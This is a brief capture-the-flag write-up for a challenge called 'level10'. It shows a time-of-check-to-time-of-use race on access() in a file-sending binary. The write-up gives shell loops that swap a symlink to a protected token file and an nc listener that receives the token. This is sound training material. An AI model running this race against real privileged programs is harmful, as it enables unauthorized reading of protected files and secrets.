Running strings on the level10 binary outputs :

%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s


We notice that the binary tries to connect to a host on port 6969.

Checking further used functions in the program indicates us that access() is used to check for permissions.

It is possible to create a race condition in order to exploit the call to access and substitute the file we want to open.

For the race condition to succeed we need to run two simultaneous shell commands:

while true; do ln -fs ~/level10 /tmp/race; ln -fs ~/token /tmp/race; done

while true; do ~/./level10 /tmp/race 127.0.0.1; done

Last step is to listen on port 6969:

nc -lk 6969
